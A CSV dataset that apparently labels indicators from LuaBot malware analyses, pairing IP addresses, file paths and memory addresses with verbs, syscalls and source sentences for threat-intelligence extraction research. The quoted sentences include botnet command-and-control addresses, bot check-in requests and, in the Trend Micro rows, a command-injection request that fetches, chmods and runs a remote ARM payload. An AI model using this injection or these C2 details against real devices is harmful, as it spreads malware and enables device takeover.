report,word,verb,objectType,prettyReg,match,label,asgSyscall,sentence
Luabot-ibmcloud.csv,217.23.3.47,,NET,ip_addr,0,0,, Reports MAL	8E7637D72E522CB52012C02EB8DDFDBE	Doug Franklin	 MAL	a220940db4be6878e47b74403a8079a1	Doug Franklin	 IP	217.23.3.47	Doug Franklin
Luabot-malwaremustdie.csv,(/proc/net/tcp*).,,FILE,/proc/net/tcp,0,0,," The second forked process is the main activity of this malware, and does malicious activities:  Checking the active (file) sockets in /proc/net/unix and network sockets (/proc/net/tcp*)."
Luabot-malwaremustdie.csv,69.171.239.0/24,,NET,ip_addr,0,0,,|32934 | 69.171.239.0/24 | FACEBOOK | US | facebook.com | Facebook Inc. 192.12.94.30 | e.gtld-servers.net.
Luabot-malwaremustdie.csv,185.14.30.214,lead/assign,NET,ip_addr,1,1,bind(), Which leads to the different IP addresses from:  185.14.30.214 | anna.me.
Luabot-malwaremustdie.csv,217.23.3.47,record/send,NET,ip_addr,1,1,send(), I recorded this CNC connection session in PCAP with its encrypted form replies from 217.23.3.47 
Luabot-malwaremustdie.csv,93.190.140.0/22,belong,NET,ip_addr,0,0,,"The listed IP addresses are all nodes of AS4998 from 109.236.80.0/20, 217.23.0.0/20 and 93.190.140.0/22 belong to a dedicated server hosting service WorldStream.NL, the customer layer service IP, in Netherlands."
Luabot-malwaremustdie.csv,/proc/net/unix,check,FILE,/proc/net/unix,0,0,," The second forked process is the main activity of this malware, and does malicious activities:  Checking the active (file) sockets in /proc/net/unix and network sockets (/proc/net/tcp*)."
Luabot-malwaremustdie.csv,0x000f1a60,,MEM,mem_addr,0,0,, All of the sections and headers are all there: Section Headers:   [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al   [ 1] .init             PROGBITS        000100b4 0000b4 00000c 00  AX  0   0  4   [ 2] .text             PROGBITS        000100c0 0000c0 0d3bac 00  AX  0   0  8   [ 3] .fini             PROGBITS        000e3c6c 0d3c6c 00000c 00  AX  0   0  4   [ 4] .rodata           PROGBITS        000e3c78 0d3c78 00dde8 00   A  0   0  8   [ 5] .ARM.exidx        ARM_EXIDX       000f1a60 0e1a60 000008 00  AL  2   0  4   [ 6] .eh_frame         PROGBITS        000f1a68 0e1a68 000004 00   A  0   0  4   [ 7] .init_array       INIT_ARRAY      00102000 0e2000 000004 00  WA  0   0  4   [ 8] .fini_array       FINI_ARRAY      00102004 0e2004 000004 00  WA  0   0  4   [ 9] .jcr              PROGBITS        00102008 0e2008 000004 00  WA  0   0  4   [10] .data             PROGBITS        00102010 0e2010 011178 00  WA  0   0  8   [11] .bss              NOBITS          00113188 0f3188 002850 00  WA  0   0  8   [12] .comment          PROGBITS        00000000 0f3188 000011 01  MS  0   0  1   [13] .ARM.attributes   ARM_ATTRIBUTES  00000000 0f3199 000031 00      0   0  1   [14] .shstrtab         STRTAB          00000000 0f31ca 00007b 00      0   0  1 Program Headers:   Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align   EXIDX          0x0e1a60 0x000f1a60 0x000f1a60 0x00008 0x00008 R   0x4   LOAD           0x000000 0x00010000 0x00010000 0xe1a6c 0xe1a6c R E 0x10000   LOAD           0x0e2000 0x00102000 0x00102000 0x11188 0x139d8 RW  0x10000   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
Luabot-malwaremustdie.csv,PID,read/get,ID,^PID.*,1,1,getpid(),"Reading all system's active process names & PID in /proc/{PID}/* with utilizing getidents64 to enumerate them, practically it's an approach to see what's running and what values are actually can be fetch, i.e."
Luabot-malwaremustdie.csv,PID,assign,ID,^PID.*,0,0,,"This new first process will assign a PID with gettid & setsid, and then fork() its process one more time to launch the real deal, the malware main process (Noted that the initial process will be dead at this time)."
Luabot-malwaremustdie.csv,0x00010000,LOAD,MEM,mem_addr,0,0,, All of the sections and headers are all there: Section Headers:   [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al   [ 1] .init             PROGBITS        000100b4 0000b4 00000c 00  AX  0   0  4   [ 2] .text             PROGBITS        000100c0 0000c0 0d3bac 00  AX  0   0  8   [ 3] .fini             PROGBITS        000e3c6c 0d3c6c 00000c 00  AX  0   0  4   [ 4] .rodata           PROGBITS        000e3c78 0d3c78 00dde8 00   A  0   0  8   [ 5] .ARM.exidx        ARM_EXIDX       000f1a60 0e1a60 000008 00  AL  2   0  4   [ 6] .eh_frame         PROGBITS        000f1a68 0e1a68 000004 00   A  0   0  4   [ 7] .init_array       INIT_ARRAY      00102000 0e2000 000004 00  WA  0   0  4   [ 8] .fini_array       FINI_ARRAY      00102004 0e2004 000004 00  WA  0   0  4   [ 9] .jcr              PROGBITS        00102008 0e2008 000004 00  WA  0   0  4   [10] .data             PROGBITS        00102010 0e2010 011178 00  WA  0   0  8   [11] .bss              NOBITS          00113188 0f3188 002850 00  WA  0   0  8   [12] .comment          PROGBITS        00000000 0f3188 000011 01  MS  0   0  1   [13] .ARM.attributes   ARM_ATTRIBUTES  00000000 0f3199 000031 00      0   0  1   [14] .shstrtab         STRTAB          00000000 0f31ca 00007b 00      0   0  1 Program Headers:   Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align   EXIDX          0x0e1a60 0x000f1a60 0x000f1a60 0x00008 0x00008 R   0x4   LOAD           0x000000 0x00010000 0x00010000 0xe1a6c 0xe1a6c R E 0x10000   LOAD           0x0e2000 0x00102000 0x00102000 0x11188 0x139d8 RW  0x10000   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
Luabot-malwaremustdie.csv,217.23.3.47,connect,NET,ip_addr,1,1,connect()," Next, the malware will connect to the CNC in 217.23.3.47 and send an HTTP/1.1 GET command."
Luabot-malwaremustdie.csv,217.23.3.47,get,NET,ip_addr,0,0,," And then, followed by the HTTP request to port TCP/80 of the same IP address: GET /bot?bid={IFACE}-{IPADDR}-{NUM}0123456:{MUTEX} HTTP/1.1 Connection: close Host: 217.23.3.47"
Luabot-malwaremustdie.csv,217.23.0.0/20,be,NET,ip_addr,0,0,,"The listed IP addresses are all nodes of AS4998 from 109.236.80.0/20, 217.23.0.0/20 and 93.190.140.0/22 belong to a dedicated server hosting service WorldStream.NL, the customer layer service IP, in Netherlands."
Luabot-malwaremustdie.csv,0x012b7390,run,MEM,mem_addr,0,0,," The malware then run test_domain() lua function to load lookup domains: 0x012b7390  0000 0000 726f 6375 676f 6f67 6c65 2e63  ........google.c 0x012b73a0  6f6d 0034 343a 2063 3100 0000 3100 0000  om.44: c1...1... 0x012b73c0  0000 0000 726d 6973 6661 6365 626f 6f6b  ........facebook 0x012b73d0  2e63 6f6d 0000 0000 3100 0000 3100 0000  .com....1...1... 0x012b73f0  0000 0000 c09e 0200 6261 6964 752e 636f  ........baidu.co 0x012b7410  e073 2b01 0402 0000 c1c4 d41a 0a00 0000  .s+............. 0x012b7420  0000 0000 c8af 2c01 616d 617a 6f6e 2e63  ......,.amazon.c 0x012b7430  6f6d 0001 a076 2b01 c040 2b01 e040 2b01  om...v+..@+..@+."
Luabot-malwaremustdie.csv,/proc/net/route.,,FILE,/proc/net/route,0,0,,"Checking the current user's privilege by getuid32, geteuid32, getgid32, getegid32 Checking the network interface name and its IP via open() to /proc/net/route."
Luabot-malwaremustdie.csv,(/proc/net/tcp*).,,FILE,/proc,0,0,," The second forked process is the main activity of this malware, and does malicious activities:  Checking the active (file) sockets in /proc/net/unix and network sockets (/proc/net/tcp*)."
Luabot-malwaremustdie.csv,69.171.239.12,look,NET,ip_addr,0,0,, The domains will be looked up to the below DNS servers: 69.171.239.12 | a.ns.facebook.com.
Luabot-malwaremustdie.csv,/proc/net/unix,check,FILE,/proc,0,0,," The second forked process is the main activity of this malware, and does malicious activities:  Checking the active (file) sockets in /proc/net/unix and network sockets (/proc/net/tcp*)."
Luabot-trendmicro.csv,hxxp://172.247.116.3:8080/Arm1,,NET,ip_addr,0,0,,hxxp://172.247.116.3:8080/Arm1 hxxp://172.247.116.21:85/Arm1 hxxp://192.154.108.2:8080/Arm1
Luabot-trendmicro.csv,hxxp://192.154.108.2:8080/Arm1;chmod,send/assign,NET,ip_addr,1,1,send() bind(),A remote attacker sends this request to random IP addresses and attempts to take advantage of the vulnerability:  POST /cgi-bin/supervisor/CloudSetup.cgi?exefile=wget -O /tmp/Arm1 hxxp://192.154.108.2:8080/Arm1;chmod 0777 /tmp/Arm1;/tmp/Arm1; HTTP/1.1
Luabot-trendmicro.csv,hxxp://172.247.116.3:8080/Arm1,,NET,ip_addr+port,0,0,,hxxp://172.247.116.3:8080/Arm1 hxxp://172.247.116.21:85/Arm1 hxxp://192.154.108.2:8080/Arm1
Luabot-trendmicro.csv,hxxp://192.154.108.2:8080/Arm1;chmod,send,NET,ip_addr+port,1,1,bind() send(),A remote attacker sends this request to random IP addresses and attempts to take advantage of the vulnerability:  POST /cgi-bin/supervisor/CloudSetup.cgi?exefile=wget -O /tmp/Arm1 hxxp://192.154.108.2:8080/Arm1;chmod 0777 /tmp/Arm1;/tmp/Arm1; HTTP/1.1
Luabot-w00tsec.csv,"sin_addr=inet_addr(46.148.18.122)},",,NET,ip_addr,0,0,,"If you run the dropper using strace to monitor the network syscalls, you can see the initial connection attempt: ./strace -v -s 9999 -e poll,select,connect,recvfrom,sendto -o network.txt ./mw/drop connect(6, {sa_family=AF_INET, sin_port=htons(4446), sin_addr=inet_addr(46.148.18.122)}, 16) = -1 ENODEV (No such device)"
Luabot-w00tsec.csv,0x000c3000,list,MEM,mem_addr,0,0,," Lastly, list the memory regions and dump the heap: vmmap dump memory arm_puma5-heap.mem 0x000c3000 0x000df000    That's it, now you have the full source code from the LuaBot:    The LuaBot source code is composed of several modules:    The bot settings, including the DNS recurser and the CnC settings are hardcoded:    The code is really well documented and it includes proxy checking functions and a masscan log parser:    Bot author is seeding random with /dev/urandom (crypgtographers rejoice):    LuaBot integrates an embedded JavaScript engine and executes scripts signed with the author's RSA key:    Meterpreter is so 2000's, the V7 JavaScript interpreter is named shiterpreter:    There's a catchy function named checkanus.penetrate_sucuri, on what seems to be some sort of bypass for Sucuri's Denial of Service (DDoS) Protection:   LuaBot has its own lua resolver function for DNS queries:   Most of the bot capabilities are in line with the ones described on the Malware Must Die!"
Luabot-w00tsec.csv,PID:,,ID,^PID.*,0,0,," First, copy gdbserver to the cable modem, run the malware (arm_puma5) and attach the debugger to the corresponding PID: ./gdbserver --multi localhost:12345 --attach 1058  "
Luabot-w00tsec.csv,192.168.100.1:12345,set,NET,ip_addr+port,0,0,," Then, start gef/GDB and attach it to the running server: gdb-multiarch -q set architecture arm set endian big set follow-fork-mode child gef-remote 192.168.100.1:12345  "
Luabot-w00tsec.csv,/dev/urandom,seed,FILE,/dev/urandom,0,0,," Lastly, list the memory regions and dump the heap: vmmap dump memory arm_puma5-heap.mem 0x000c3000 0x000df000    That's it, now you have the full source code from the LuaBot:    The LuaBot source code is composed of several modules:    The bot settings, including the DNS recurser and the CnC settings are hardcoded:    The code is really well documented and it includes proxy checking functions and a masscan log parser:    Bot author is seeding random with /dev/urandom (crypgtographers rejoice):    LuaBot integrates an embedded JavaScript engine and executes scripts signed with the author's RSA key:    Meterpreter is so 2000's, the V7 JavaScript interpreter is named shiterpreter:    There's a catchy function named checkanus.penetrate_sucuri, on what seems to be some sort of bypass for Sucuri's Denial of Service (DDoS) Protection:   LuaBot has its own lua resolver function for DNS queries:   Most of the bot capabilities are in line with the ones described on the Malware Must Die!"
Luabot-w00tsec.csv,8.8.8.8,set/curl,NET,ip_addr,1,1,send(),"The other binary, .sox (4b8c0ec8b36c6bf679b3afcc6f54442a), sets the device's DNS servers to 8.8.8.8 and 8.8.4.4 and provides multiple tunneling functionalities including SOCKS/proxy, DNS and IPv6."
Luabot-w00tsec.csv,46.148.18.122,know,NET,ip_addr,0,0,,The malicious IP 46.148.18.122 is known for bruteforcing SSH servers and trying to exploit Linksys router command injections in the wild.
Luabot-w00tsec.csv,"open(/proc/net/route,",,FILE,/proc/net/route,0,0,,"1078  +++ exited with 0 +++ 1079  setsid()                          = 1079 1079  clone( <unfinished ...> (...) 1080  gettimeofday({500, 278384}, NULL) = 0 1080  socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 10<socket:[22231]> 1080  ioctl(10<socket:[22231]>, FIONBIO, [1]) = 0 1080  setsockopt(10<socket:[22231]>, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0 1080  bind(10<socket:[22231]>, {sa_family=AF_INET, sin_port=htons(11833), sin_addr=inet_addr(0.0.0.0)}, 16) = 0 1080  listen(10<socket:[22231]>, 1024)  = 0 1080  open(/proc/net/route, O_RDONLY|O_LARGEFILE) = 11</proc/net/route> (...) 1080  gettimeofday({500, 318385}, NULL) = 0 1080  _newselect(32, [8<pipe:[22229]> 10<socket:[22231]>], [], NULL, {0, 959999}) = 0 (Timeout) 1080  gettimeofday({501, 278401}, NULL) = 0 1080  socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 11<socket:[22282]> 1080  ioctl(11<socket:[22282]>, FIONBIO, [1]) = 0 1080  connect(11<socket:[22282]>, {sa_family=AF_INET, sin_port=htons(1055), sin_addr=inet_addr(80.87.205.92)}, 16) = -1 ENETUNREACH (Network is unreachable) 1080  close(11<socket:[22282]>)         = 0 1080  write(0<socket:[4448]>, GET /getcmds?bid=notgenerated HTTP/1.1\r\nConnection: close\r\nHost: 80.87.205.92\r\n\r\n, 81) = 81"
Luabot-w00tsec.csv,"open(/proc/net/route,",,FILE,/proc,0,0,,"1078  +++ exited with 0 +++ 1079  setsid()                          = 1079 1079  clone( <unfinished ...> (...) 1080  gettimeofday({500, 278384}, NULL) = 0 1080  socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 10<socket:[22231]> 1080  ioctl(10<socket:[22231]>, FIONBIO, [1]) = 0 1080  setsockopt(10<socket:[22231]>, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0 1080  bind(10<socket:[22231]>, {sa_family=AF_INET, sin_port=htons(11833), sin_addr=inet_addr(0.0.0.0)}, 16) = 0 1080  listen(10<socket:[22231]>, 1024)  = 0 1080  open(/proc/net/route, O_RDONLY|O_LARGEFILE) = 11</proc/net/route> (...) 1080  gettimeofday({500, 318385}, NULL) = 0 1080  _newselect(32, [8<pipe:[22229]> 10<socket:[22231]>], [], NULL, {0, 959999}) = 0 (Timeout) 1080  gettimeofday({501, 278401}, NULL) = 0 1080  socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 11<socket:[22282]> 1080  ioctl(11<socket:[22282]>, FIONBIO, [1]) = 0 1080  connect(11<socket:[22282]>, {sa_family=AF_INET, sin_port=htons(1055), sin_addr=inet_addr(80.87.205.92)}, 16) = -1 ENETUNREACH (Network is unreachable) 1080  close(11<socket:[22282]>)         = 0 1080  write(0<socket:[4448]>, GET /getcmds?bid=notgenerated HTTP/1.1\r\nConnection: close\r\nHost: 80.87.205.92\r\n\r\n, 81) = 81"
